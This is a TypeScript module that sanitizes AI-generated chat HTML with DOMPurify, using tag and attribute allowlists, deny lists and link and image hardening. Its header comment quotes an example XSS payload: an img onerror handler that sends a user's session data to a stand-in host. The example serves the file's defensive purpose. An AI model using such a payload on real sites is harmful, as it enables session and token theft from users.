/**
 * HTML sanitization helper for AI chat responses.
 *
 * AI agents return HTML (Telegram-style subset + rich markup). Raw
 * `dangerouslySetInnerHTML` is an XSS vector: if an agent or an upstream
 * attacker injects `<img src=x onerror="fetch('/api/me', {credentials:'include'})
 * .then(r=>r.json()).then(d=>fetch('https://evil/',{method:'POST',body:...}))">`,
 * JWT from `localStorage` is exfiltrated.
 *
 * Previously we had a hand-rolled regex allowlist in two places (web AI chat +
 * TMA chat). This centralises sanitation through DOMPurify with a strict
 * configuration and an `afterSanitizeAttributes` hook that forces
 * `target="_blank" rel="noopener noreferrer"` on links.
 */
import DOMPurify, { type Config } from 'dompurify';

/**
 * Tags permitted in AI responses.
 * Covers:
 *  - Telegram-HTML subset historically used (b, i, u, s, code, pre, blockquote)
 *  - Rich markup that real AI responses emit (p, br, strong, em, ul/ol/li,
 *    headings, links, tables, images)
 */
const ALLOWED_TAGS = [
    // text formatting
    'p', 'br', 'span', 'div',
    'strong', 'b', 'em', 'i', 'u', 's',
    'code', 'pre',
    // lists
    'ul', 'ol', 'li',
    // quotes / headings
    'blockquote',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    // links & images
    'a', 'img',
    // tables
    'table', 'thead', 'tbody', 'tfoot', 'tr', 'td', 'th',
    // horizontal rule
    'hr',
];

/**
 * Attributes permitted globally. Intentionally narrow — no `style`, no event
 * handlers, no `class` (AI chat styling comes from parent CSS, not inline).
 */
const ALLOWED_ATTR = [
    'href',       // <a>
    'src', 'alt', // <img>
    'title',      // tooltips on <a>/<img>
    // table cell hints
    'colspan', 'rowspan',
];

/**
 * DOMPurify config:
 *  - Only allow `http(s):`, `mailto:` etc. — explicitly forbid `javascript:`
 *    (default DOMPurify regex already covers this, kept for clarity).
 *  - `ALLOW_DATA_ATTR: false` — strip `data-*` (can be used for client-side
 *    XSS sinks via libraries that pick them up).
 *  - `FORBID_TAGS`/`FORBID_ATTR` — belt-and-braces even though they shouldn't
 *    slip past `ALLOWED_TAGS`.
 */
const BASE_CONFIG: Config = {
    ALLOWED_TAGS: [...ALLOWED_TAGS],
    ALLOWED_ATTR: [...ALLOWED_ATTR],
    ALLOW_DATA_ATTR: false,
    ALLOW_ARIA_ATTR: false,
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'svg', 'math'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'onchange', 'oninput', 'onsubmit'],
    // Disallow unknown URL protocols; this also blocks `javascript:`, `vbscript:`, raw `data:` (except
    // for images — see hook below that adds an explicit allowlist for data:image/*).
    ALLOW_UNKNOWN_PROTOCOLS: false,
    KEEP_CONTENT: true,
    // NB: we intentionally omit `RETURN_TRUSTED_TYPE` — the default is `false`
    // which matches DOMPurify's string-returning overload (what React's
    // `dangerouslySetInnerHTML={{ __html: ... }}` needs). Setting it to `false`
    // explicitly confuses the TS overload resolver.
};

let hookRegistered = false;

function ensureHookRegistered(): void {
    if (hookRegistered) return;
    hookRegistered = true;

    /**
     * Hook — after DOMPurify has filtered attributes, harden `<a>` and `<img>`:
     *  1. All `<a href="...">` get `target="_blank" rel="noopener noreferrer"`.
     *     Prevents `target=_blank` reverse tabnabbing + cross-origin window.opener leak.
     *  2. Links must start with `http://`, `https://`, `mailto:` or `/` (internal).
     *     Anything else (e.g. `javascript:`) is already stripped by DOMPurify's
     *     protocol check, but we double-guard by validating the final value.
     *  3. `<img src="data:...">` — only allow `data:image/` prefixes. Block
     *     `data:text/html`, which can smuggle script via srcdoc-style abuse.
     */
    DOMPurify.addHook('afterSanitizeAttributes', (node: Element) => {
        if (node.tagName === 'A') {
            const href = node.getAttribute('href') || '';
            // Defence-in-depth: DOMPurify already blocks `javascript:` etc., but
            // any residual weird value → drop the attribute entirely.
            const ok =
                href === '' ||
                /^https?:\/\//i.test(href) ||
                href.startsWith('mailto:') ||
                href.startsWith('/') ||
                href.startsWith('#');
            if (!ok) {
                node.removeAttribute('href');
            }
            node.setAttribute('target', '_blank');
            node.setAttribute('rel', 'noopener noreferrer');
        }

        if (node.tagName === 'IMG') {
            const src = node.getAttribute('src') || '';
            // Only permit http(s) images or data:image/<format>;base64,...
            const ok =
                /^https?:\/\//i.test(src) ||
                /^data:image\/(png|jpeg|jpg|gif|webp|svg\+xml);/i.test(src);
            if (!ok) {
                node.removeAttribute('src');
            }
            // Make images non-interactive (no click handlers, no referrer leak)
            node.setAttribute('referrerpolicy', 'no-referrer');
            node.setAttribute('loading', 'lazy');
        }
    });
}

/**
 * Sanitize AI-generated HTML before rendering via
 * `dangerouslySetInnerHTML={{ __html: sanitizeAIHtml(raw) }}`.
 *
 * Strips:
 *  - All scripts, styles, iframes, event handlers (`onerror`, `onclick`, ...)
 *  - `javascript:` / `data:` (except `data:image/*`) URLs
 *  - Any tag/attribute not on the allowlist above
 *
 * Hardens:
 *  - `<a>` → `target="_blank" rel="noopener noreferrer"`
 *  - `<img>` → `referrerpolicy="no-referrer" loading="lazy"`, `src` validated
 */
export function sanitizeAIHtml(html: string): string {
    if (!html) return '';
    ensureHookRegistered();
    return DOMPurify.sanitize(html, BASE_CONFIG);
}

// Exported for tests only — allows resetting the hook state between isolated
// module mocks. Not part of the public API.
export function __resetForTests(): void {
    if (hookRegistered) {
        DOMPurify.removeHook('afterSanitizeAttributes');
        hookRegistered = false;
    }
}
